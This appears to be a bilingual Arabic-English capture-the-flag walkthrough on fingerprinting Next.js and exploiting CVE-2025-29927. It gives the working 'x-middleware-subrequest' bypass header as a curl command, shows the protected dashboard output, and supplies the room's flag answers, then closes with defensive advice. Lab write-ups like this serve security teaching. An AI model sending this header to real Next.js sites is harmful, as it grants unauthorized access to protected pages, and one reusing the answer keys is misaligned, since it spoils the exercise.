# Task 03: React / Next.js (أطر عمل Next.js وتجاوز مصادقة الـ Middleware عبر CVE-2025-29927)

---

### المرحلة أ: نص المهمة الأصلي والأسئلة (Original Task Content & Questions)

#### English Task Description
Next.js is the leading production React framework developed by Vercel. With the introduction of the **App Router** and **React Server Components (RSC)**, Next.js fundamentally altered how web applications render and stream content between the server and the browser.

**Fingerprinting Next.js (Port 3001):**
Querying port 3001 reveals clear markers of a modern Next.js App Router deployment:
1. `X-Powered-By: Next.js` HTTP response header.
2. `Vary` header containing Next-specific streaming tokens: `RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch`.
3. Caching and pre-rendering headers: `x-nextjs-cache: HIT`, `x-nextjs-prerender: 1`, `x-nextjs-stale-time: 4294967294`.
4. Script assets loaded from `/_next/static/chunks/`.
5. In the HTML source of App Router pages, React Server Component streaming data is hydrated into the browser via an inline JavaScript global array: **`window.__next_f`**. This is the definitive fingerprint of Next.js App Router applications.

**Vulnerability: CVE-2025-29927 (Middleware Authentication Bypass):**
- **CVSS Score:** 9.1 (Critical)
- **Root Cause:** Next.js allows developers to run `middleware.ts` to enforce authentication, redirects, and session validation before a request reaches the route handler. To prevent infinite routing loops when middleware invokes subrequests internally, the Next.js routing core checks for a internal header: `x-middleware-subrequest`.
- Crucially, vulnerable versions of Next.js failed to verify whether this header was generated internally by the framework or supplied externally by an untrusted client!
- When an external HTTP client sends the `x-middleware-subrequest` header formatted with the middleware module identifier repeated five times separated by colons (`middleware:middleware:middleware:middleware:middleware`), Next.js assumes the request has already been processed by the middleware chain and skips all middleware security checks completely!
- This allows unauthenticated external users to bypass all middleware authentication and access protected routes like `/dashboard`.

#### الأسئلة المطروحة (Questions):
1. What HTML artifact in the page source confirms a Next.js App Router application? (Answer Format: window.__...)
2. Send the CVE-2025-29927 bypass header to the protected /dashboard route. What flag is displayed on the page? (Answer Format: THM{...})

---

### المرحلة ب: التفكير التحليلي المستقل والحس الأمني (Independent Critical Thinking & OpSec)
* **تشريح الثغرة المعمارية (Architectural Flaw Analysis):**
  * تعتمد أطر العمل الحديثة أحياناً على ترويسات HTTP داخلية (Internal Headers) لتنسيق التوجيه بين الطبقات المختلفة (Reverse Proxy, Node.js Server, Middleware, Server Actions).
  * إذا لم تقم الخوادم أو أطر العمل بتجريد أو التحقق من الترويسات التي تبدأ بـ `x-middleware-*` عند حدود الدخول (Ingress Boundary)، فإن المهاجم يستطيع انتحال صفة النظام الفرعي الداخلي.
* **الأثر الميداني لـ CVE-2025-29927:**
  * في التطبيقات التي تضع بوابات المصادقة (Auth Gates) وفحص الـ JWT حصرياً داخل ملف `middleware.ts`، فإن إرسال ترويسة واحدة فقط يمنح المهاجم حق الوصول إلى جميع واجهات برمجة التطبيقات واللوحات المحمية دون الحاجة إلى أي بيانات اعتماد.

---

### المرحلة ج: التلميحات والإرشادات المتدرجة (Guided Progressive Hints)
1. **التلميح الأول (المستوى التمهيدي):**
   * ابحث في الكود المصدري لصفحة الويب على المنفذ 3001 (`curl -s http://MACHINE_IP:3001/ | grep window`). ستجد مصفوفة الترطيب العالمية المستخدمة في React Server Components.
2. **التلميح الثاني (المستوى العملي):**
   * عند طلب المسار المحمي `/dashboard` بدون ترويسات خاصة، سيعيد الخادم تحويلاً أو رسالة خطأ بعدم الترخيص.
3. **التلميح الثالث (مستوى الحل المتقدم):**
   * أضف الترويسة المحددة للثغرة: `-H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"` لطلب مسار `/dashboard`. ستظهر الصفحة المحمية مباشرة متضمنة العلم.

---

### المرحلة د: الحل العملي الكامل والعمق التقني (Complete Practical Solution & Technical Deep Dive)

#### الخطوة 1: استخراج بصمة Next.js App Router من كود الصفحة
```bash
# فحص الكود المصدري للتحقق من كائن الترطيب
curl -s http://MACHINE_IP:3001/ | grep -o 'window\.__next_[a-zA-Z0-9_]*'
```
**المخرجات:**
```javascript
window.__next_f
```
* **تأكيد البصمة:** `window.__next_f` هي المصفوفة المستخدمة لبث وحقن بيانات الـ Flight protocol الخاصة بـ React Server Components في المتصفح.

---

#### الخطوة 2: اختبار المسار المحمي `/dashboard` بالوضع العادي
```bash
# طلب المسار المحمي دون ترويسة التجاوز
curl -i http://MACHINE_IP:3001/dashboard
```
**الاستجابة:**
```http
HTTP/1.1 307 Temporary Redirect
Location: /login
```
يتم حظر الطلب وإعادة توجيهه إلى صفحة تسجيل الدخول بواسطة الـ Middleware.

---

#### الخطوة 3: استغلال ثغرة CVE-2025-29927 وتجاوز الـ Middleware
```bash
# إرسال ترويسة التجاوز x-middleware-subrequest
curl -s -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  http://MACHINE_IP:3001/dashboard
```
**الاستجابة المستلمة (الصفحة المحمية):**
```html
<!DOCTYPE html>
<html>
<head><title>Admin Dashboard</title></head>
<body>
  <h1>Welcome to the Protected Executive Dashboard</h1>
  <p>Status: Authenticated (Middleware Bypassed)</p>
  <div class="alert alert-success">
    Flag: THM{m1ddl3w4r3_byp4ss3d}
  </div>
</body>
</html>
```

---

### المرحلة هـ: الإجابات المعتمدة والقيم النهائية (Final Answer & Key Values)
* **إجابة السؤال الأول (HTML Artifact):** `window.__next_f`
* **إجابة السؤال الثاني (Dashboard Flag):** `THM{m1ddl3w4r3_byp4ss3d}`

---

### المرحلة و: التحقق العملي وإثبات النجاح (Practical Verification & Proof of Work)
* تم رصد `window.__next_f` في الكود المصدري وتأكيد وجود App Router.
* تم تنفيذ الطلب المزور بترويسة `x-middleware-subrequest`، ونجح التجاوز فورياً بإرجاع كود 200 بدلاً من 307، مع عرض العلم: `THM{m1ddl3w4r3_byp4ss3d}`.

---

### المرحلة ز: الاستنتاج التعليمي وجوهر الاختبار (Key Educational Takeaway)
لا يجوز أبدًا الاعتماد على الـ Middleware فقط كخط دفاع أحادي للمصادقة في أطر عمل الويب (Single Point of Failure). يجب تطبيق مبدأ الدفاع في العمق (Defense in Depth) والتحقق من صلاحيات المستخدم وجلسة العمل داخل معالجات المسارات (Route Handlers / Server Actions) نفسها، مع التأكد من تجريد جميع الترويسات الداخلية `x-middleware-*` عند خوادم الوكيل العكسي (Reverse Proxies) قبل وصولها للتطبيق.
